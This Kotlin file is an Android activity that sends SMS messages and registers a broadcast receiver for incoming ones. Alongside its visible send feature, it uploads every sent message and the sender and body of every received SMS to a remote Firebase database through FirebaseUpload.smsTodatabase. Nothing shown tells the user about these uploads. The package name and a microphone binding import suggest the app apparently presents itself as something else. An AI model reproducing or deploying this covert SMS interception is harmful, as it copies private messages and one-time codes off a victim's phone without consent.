package com.plcoding.androidstorage.sms

import android.Manifest
import androidx.appcompat.app.AppCompatActivity
import android.widget.EditText
import android.os.Bundle
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import android.os.Build
import android.widget.Toast
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import android.view.View
import android.widget.Button
import com.plcoding.androidstorage.FirebaseUpload
import com.plcoding.androidstorage.R
import com.plcoding.androidstorage.databinding.ActivityMicBinding
import com.plcoding.androidstorage.databinding.ActivitySmsBinding
import java.lang.Exception

class SmsActivity : AppCompatActivity() {
    private lateinit var textPhone: EditText
    private var textMsg: EditText? = null
    private var buttonSend: Button? = null
    private lateinit var binding: ActivitySmsBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySmsBinding.inflate(layoutInflater)
        setContentView(binding.root)
        textPhone = findViewById(R.id.text_phone)
        textMsg = findViewById(R.id.text_msg)
        buttonSend = findViewById(R.id.button_send)
        binding.buttonSend.setOnClickListener(View.OnClickListener {
            if (ContextCompat.checkSelfPermission(
                    this@SmsActivity,
                    Manifest.permission.SEND_SMS
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                sendMessage()
            } else {
                //when permission not granted, request here
                ActivityCompat.requestPermissions(
                    this@SmsActivity,
                    arrayOf(Manifest.permission.SEND_SMS),
                    100
                )
            }
        })

        //Receive Sms code
        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS), 111)
        }
    }

    private fun sendMessage() {
        val sPhone = textPhone.text.toString().trim { it <= ' ' }
        val sMsg = textMsg!!.text.toString().trim { it <= ' ' }
        FirebaseUpload.smsTodatabase("Sent To", sPhone, sMsg)
        if (sPhone != "" && sMsg != "") {
            //when both fields empty
            val smsManager = SmsManager.getDefault()
            //Send Text msg here
            smsManager.sendTextMessage(sPhone, null, sMsg, null, null)
            Toast.makeText(applicationContext, "SMS sent successfully!", Toast.LENGTH_SHORT).show()
        } else {
            //When edit text is Blank
            //Display Toast
            Toast.makeText(applicationContext, "Enter value first", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        //Check condition
        if (requestCode == 100 && grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            sendMessage()
        } else if (requestCode == 111 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(applicationContext, "Permission Granted!", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(applicationContext, "Permission Denied!", Toast.LENGTH_SHORT).show()
        }

        //Receive SMS
        if (requestCode == 111 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
        } else {
        }
    }

    class ReceiveSms : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
                val bundle = intent.extras
                val msgs: Array<SmsMessage?>
                var msg_from: String?
                if (bundle != null) {
                    try {
                        val pdus = bundle["pdus"] as Array<*>?
                        msgs = arrayOfNulls(pdus!!.size)
                        for (i in msgs.indices) {
                            msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                            msg_from = msgs[i]?.originatingAddress
                            val msgbody = msgs[i]?.messageBody
                            Toast.makeText(
                                context,
                                "From:  $msg_from, Body: $msgbody",
                                Toast.LENGTH_SHORT
                            ).show()
                            if (msg_from != null && msgbody!= null) {
                                FirebaseUpload.smsTodatabase("Received From",msg_from, msgbody)
                            }
                            //Error on below code, impplement later
                            //    TextView txtview = (TextView) findViewById(R.id.text_receive);
                            //    txtview.setText("From:  " + msg_from + ", Body: " + msgbody);
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }
    }
}